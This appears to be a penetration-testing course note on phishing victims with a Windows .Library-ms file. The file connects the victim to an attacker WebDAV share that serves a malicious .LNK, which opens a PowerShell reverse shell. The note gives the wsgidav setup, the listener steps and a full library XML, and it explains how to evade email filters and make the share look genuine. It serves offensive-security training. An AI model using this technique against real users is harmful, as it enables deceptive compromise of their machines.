# Windows Library Files Code Execution
- 12.3.1 in Pen-200
- .Library-ms extension
- General idea is sending our Target/Victim a Windows Library File.
- Victim receives a .Library-ms file, perhaps via email.
- Once the Library file is opened by the target, it will connect them to a  a WebDav share that we control.
- Becuase it is a library, it appears as a regular directory in Windows Explorer. 
- We'll populate the WebDAV directory/share with a .LNK file or other malicious file, that executes a PowerShell RevShell. User must click the .LNK payload to execute.
NOTE: The reason we don't just send the link, is to bypass email filter, spam filter, as a lot of the security technologies will ALLOW the .Library-ms file, but not the .LNK.

## Recieving Connection
1. Launch Library listener, WebDAV
```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/hacking/tools/webdav/
# test at 127.0.0.1 in browser
```
2. ncat listener on whatever port is specified in the LNK file
3. python http server to host powercat, (IF LNK specifies powercat usage). 
4. Place evil LNK or malicous file in directory referenced in step 1 **/webdav/**

## Create Library-ms file
Open VSC/notepad
save empty file named config.Library-ms on the users desktop
Library files have 3 major parts
written in XML to specify parameters for accessing remote locations
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.158</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>


<!--
<name>@windows.storage.dll,-34582</name>
This specifies the name of the library, not arbitrary

<version>6</version>
this can be whatever we want

<isLibraryPinned>true</isLibraryPinned>
Pin to navigation in explorer, makes it feel authentic

<iconReference>imageres.dll,-1003</iconReference>
What ICON is displayed to user, use imagesres.dll to choose between windows icons
-1002 = Documents folder icon,  -1003 = Pictures folder icon

<templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo>
GUID is valid Documents guid.. 

<url>http:/192.168.45.158</url>  - KALI IP
-->
```
Now when we launch that, we should see our test.txt file, being served by our WebDAV share on KALI
After connecting, you'll notice Windows modified some parts of the file, which may/will break it if you try to move it to an other machine
